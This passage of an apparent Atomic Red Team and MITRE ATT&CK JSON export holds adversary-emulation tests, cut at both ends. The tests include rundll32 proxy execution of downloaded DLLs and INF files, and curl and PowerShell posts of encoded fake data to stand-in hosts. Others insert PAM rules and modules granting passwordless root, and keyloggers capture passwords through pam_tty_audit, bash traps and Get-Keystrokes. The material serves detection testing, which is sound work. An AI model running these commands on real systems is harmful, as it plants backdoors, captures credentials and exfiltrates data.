\"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n", "name": "command_prompt"}}, {"name": "Rundll32 ieadvpack.dll Execution", "auto_generated_guid": "5e46a58e-cbf6-45ef-a289-ed7754603df9", "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n", "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n", "name": "command_prompt"}}, {"name": "Rundll32 syssetup.dll Execution", "auto_generated_guid": "41fa324a-3946-401e-bbdd-d7991c628125", "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n", "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"#{inf_to_execute}\"\n", "name": "command_prompt"}}, {"name": "Rundll32 setupapi.dll Execution", "auto_generated_guid": "71d771cd-d6b3-4f34-bc76-a63d47a10b19", "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n", "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"#{inf_to_execute}\"\n", "name": "command_prompt"}}, {"name": "Execution of HTA and VBS Files using Rundll32 and URL.dll", "auto_generated_guid": "22cfde89-befe-4e15-9753-47306b37a6e3", "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n", "supported_platforms": ["windows"], "executor": {"command": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n", "name": "command_prompt"}}, {"name": "Launches an executable using Rundll32 and pcwutl.dll", "auto_generated_guid": "9f5d081a-ee5a-42f9-a04e-b7bdc487e676", "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n", "supported_platforms": ["windows"], "input_arguments": {"exe_to_launch": {"description": "Path of the executable to launch", "type": "path", "default": "%windir%\\System32\\notepad.exe"}}, "executor": {"command": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n", "name": "command_prompt"}}, {"name": "Execution of non-dll using rundll32.exe", "auto_generated_guid": "ae3a8605-b26e-457c-b6b3-2702fd335bac", "description": "Rundll32.exe running non-dll \n", "supported_platforms": ["windows"], "input_arguments": {"input_url": {"description": "Url to download the DLL", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"}, "input_file": {"description": "Non-dll file", "type": "string", "default": "C:\\Users\\$env:username\\Downloads\\calc.png"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Non-dll file must exist on disk at specified location\n", "prereq_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"}], "executor": {"name": "powershell", "command": "rundll32.exe #{input_file}, StartW\n"}}, {"name": "Rundll32 with Ordinal Value", "auto_generated_guid": "9fd5a74b-ba89-482a-8a3e-a5feaa3697b0", "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n", "supported_platforms": ["windows"], "input_arguments": {"input_url": {"description": "Url to download the DLL", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll"}, "input_file": {"description": "DLL File", "type": "string", "default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL file must exist on disk at specified location\n", "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"}], "executor": {"name": "command_prompt", "command": "rundll32.exe \"#{input_file}\",#2\n"}}, {"name": "Rundll32 with Control_RunDLL", "auto_generated_guid": "e4c04b6f-c492-4782-82c7-3bf75eb8077e", "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n", "supported_platforms": ["windows"], "input_arguments": {"input_url": {"description": "Url to download the DLL", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"}, "input_file": {"description": "DLL File", "type": "string", "default": "PathToAtomicsFolder\\T1047\\bin\\calc.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL file must exist on disk at specified location\n", "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"}], "executor": {"name": "command_prompt", "command": "rundll32.exe shell32.dll,Control_RunDLL \"#{input_file}\"\n"}}, {"name": "Rundll32 with desk.cpl", "auto_generated_guid": "83a95136-a496-423c-81d3-1c6750133917", "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n", "supported_platforms": ["windows"], "input_arguments": {"exe_to_launch": {"description": "Path of the executable to launch", "type": "path", "default": "%windir%\\System32\\calc.exe"}}, "executor": {"name": "command_prompt", "command": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n", "cleanup_command": "del not_an_scr.scr"}}]}, "T1613": {"name": "Container and Resource Discovery", "technique_id": "attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336", "external_id": "T1613", "data_components": ["Container Enumeration", "Pod Enumeration"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ", "atomic_tests": [{"name": "Container and ResourceDiscovery", "auto_generated_guid": "8a895923-f99f-4668-acf2-6cc59a44f05e", "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.", "supported_platforms": ["containers"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker  --no-pager\n", "get_prereq_command": "sudo systemctl start docker\n"}], "executor": {"command": "docker build -t t1613  $PathtoAtomicsFolder/T1613/src/\ndocker run --name t1613_container  -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)", "cleanup_command": "docker stop t1613_container\ndocker rmi -f t1613_container", "name": "sh"}}]}, "T1132.001": {"name": "Standard Encoding", "technique_id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c", "external_id": "T1132.001", "data_components": ["Network Traffic Content"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c"], "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "atomic_tests": [{"name": "Base64 Encoded data.", "auto_generated_guid": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25", "description": "Utilizing a common technique for posting base64 encoded data.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"destination_url": {"description": "Destination URL to post encoded data.", "type": "url", "default": "redcanary.com"}, "base64_data": {"description": "Encoded data to post using fake Social Security number 111-11-1111.", "type": "string", "default": "MTExLTExLTExMTE="}}, "executor": {"command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n", "name": "sh"}}, {"name": "Base64 Encoded data (freebsd)", "auto_generated_guid": "2d97c626-7652-449e-a986-b02d9051c298", "description": "Utilizing a common technique for posting base64 encoded data.\n", "supported_platforms": ["linux"], "input_arguments": {"destination_url": {"description": "Destination URL to post encoded data.", "type": "url", "default": "redcanary.com"}, "base64_data": {"description": "Encoded data to post using fake Social Security number 111-11-1111.", "type": "string", "default": "MTExLTExLTExMTE="}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires curl\n", "prereq_command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n", "get_prereq_command": "pkg install -y curl\n"}], "executor": {"command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n", "name": "sh"}}, {"name": "XOR Encoded data.", "auto_generated_guid": "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08", "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n", "supported_platforms": ["windows"], "input_arguments": {"destination_url": {"description": "Destination URL to post encoded data.", "type": "url", "default": "example.com"}, "plaintext": {"description": "Plain text mimicking victim data sent to C2 server.", "type": "string", "default": "Path\\n----\\nC:\\Users\\victim"}, "key": {"description": "XOR key used for encoding the plaintext.", "type": "string", "default": "abcdefghijklmnopqrstuvwxyz123456"}}, "executor": {"command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n", "name": "powershell"}}]}, "T1556.003": {"name": "Pluggable Authentication Modules", "technique_id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771", "external_id": "T1556.003", "data_components": ["Logon Session Creation", "File Modification"], "kill_chain_phases": ["credential-access", "defense-evasion", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)", "atomic_tests": [{"name": "Malicious PAM rule", "auto_generated_guid": "4b9dde80-ae22-44b1-a82a-644bf009eb9c", "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_pam_conf": {"description": "PAM config file to modify.", "type": "string", "default": "/etc/pam.d/su-l"}, "pam_rule": {"description": "Rule to add to the PAM config.", "type": "string", "default": "auth sufficient pam_succeed_if.so uid >= 0"}, "index": {"description": "Index where the rule is inserted.", "type": "integer", "default": 1}}, "executor": {"name": "sh", "elevation_required": true, "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"}}, {"name": "Malicious PAM rule (freebsd)", "auto_generated_guid": "b17eacac-282d-4ca8-a240-46602cf863e3", "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_pam_conf": {"description": "PAM config file to modify.", "type": "string", "default": "/etc/pam.d/su"}, "pam_rule": {"description": "Rule to add to the PAM config.", "type": "string", "default": "auth sufficient pam_succeed_if.so uid >= 0"}, "index": {"description": "Index where the rule is inserted.", "type": "integer", "default": 8}}, "executor": {"name": "sh", "elevation_required": true, "command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "cleanup_command": "sudo sed -i \"\" \"/#{pam_rule}/d\" #{path_to_pam_conf}\n"}}, {"name": "Malicious PAM module", "auto_generated_guid": "65208808-3125-4a2e-8389-a0a00e9ab326", "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_pam_conf": {"description": "PAM config file to modify.", "type": "string", "default": "/etc/pam.d/su-l"}, "pam_rule": {"description": "Rule to add to the PAM config.", "type": "string", "default": "auth sufficient /tmp/pam_evil.so"}, "index": {"description": "Index where the rule is inserted.", "type": "integer", "default": 1}, "path_to_pam_module_source": {"description": "Path to PAM module source code.", "type": "path", "default": "PathToAtomicsFolder/T1556.003/src/pam_evil.c"}, "path_to_pam_module": {"description": "Path to PAM module object", "type": "path", "default": "/tmp/pam_evil.so"}}, "dependencies": [{"description": "The PAM development library must be installed to build the PAM module\n", "prereq_command": "if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi\n"}, {"description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n", "prereq_command": "if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"}}]}, "T1056.001": {"name": "Keylogging", "technique_id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4", "external_id": "T1056.001", "data_components": ["OS API Execution", "Windows Registry Key Modification", "Driver Load"], "kill_chain_phases": ["collection", "credential-access"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ", "atomic_tests": [{"name": "Input Capture", "auto_generated_guid": "d9b633ca-8efb-45e6-b838-70f595c6ae26", "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n", "supported_platforms": ["windows"], "input_arguments": {"filepath": {"description": "Name of the local file, include path.", "type": "path", "default": "$env:TEMP\\key.log"}}, "dependencies": [{"description": "Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"\n"}], "executor": {"command": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}\n", "cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Living off the land Terminal Input Capture on Linux with pam.d", "auto_generated_guid": "9c6bdb34-a89f-4b90-acb1-5970614c711b", "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n", "dependencies": [{"description": "Checking if pam_tty_audit.so is installed\n", "prereq_command": "test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n", "get_prereq_command": "echo \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n"}], "supported_platforms": ["linux"], "executor": {"command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth\n", "cleanup_command": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n", "name": "sh", "elevation_required": true}}, {"name": "Logging bash history to syslog", "auto_generated_guid": "0e59d59d-3265-4d35-bebd-bf5c1ec40db5", "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "This test requires to be run in a bash shell and that logger and tee are installed.\n", "prereq_command": "if [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v tee)\" ]; then echo -e \"\\n***** tee NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n", "cleanup_command": "unset PROMPT_COMMAND\n"}}, {"name": "Logging sh history to syslog/messages", "auto_generated_guid": "b04284dc-3bd9-4840-8d21-61b8d31c99f2", "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .shrc or .profile \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "This test requires to be run in a bash shell and that logger and tee are installed.\n", "prereq_command": "if [ \"$(echo $SHELL)\" != \"/bin/sh\" ]; then echo -e \"\\n***** sh not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n", "cleanup_command": "unset PS2\n"}}, {"name": "Bash session based keylogger", "auto_generated_guid": "7f85a946-a0ea-48aa-b6ac-8ff539278258", "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "This test requires to be run in a bash shell\n", "prereq_command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "input_arguments": {"output_file": {"name": "output_file", "description": "File to store captured commands", "type": "string", "default": "/tmp/.keyboard.log"}}, "executor": {"name": "bash", "elevation_required": false, "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n", "cleanup_command": "rm #{output_file}\n"}}, {"name": "SSHD PAM keylogger", "auto_generated_guid": "81d7d2ad-d644-4b6a-bea7-28ffe43becca", "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "This test requires sshd and auditd\n", "prereq_command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "input_arguments": {"user_account": {"description": "Basic ssh user account for testing.", "type": "string", "default": "ubuntu"}}, "executor": {"name": "sh", "elevation_required": true, "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n", "cleanup_command": "cp -fv /tmp/sshd /etc/pam.d/\n"}}, {"name": "Auditd keylogger", "auto_generated_guid": "a668edb9-334e-48eb-8c2e-5413a40867af", "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "This test requires sshd and auditd\n", "prereq_command": "if [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\") \n", "cleanup_command": "systemctl restart auditd\n"}}, {"name": "MacOS Swift Keylogger", "auto_generated_guid": "aee3a097-4c5c-4fff-bbd3-0a705867ae29", "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n", "supported_platforms": ["macos"], "input_arguments": {"swift_src": {"description": "Location of swift script", "type": "path", "default": "PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.\n", "prereq_command": "if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"command": "swift #{swift_src} -keylog\n", "cleanup_command": "kill `pgrep swift-frontend`\n", "name": "bash", "elevation_required": false}}]}, "T1222.002": {"name": "Linux and Mac File and Directory Permissions Modification", "technique_id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345", "external_id": "T1222.002", "data_components": ["Command Execution", "Process Creation", "File Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, 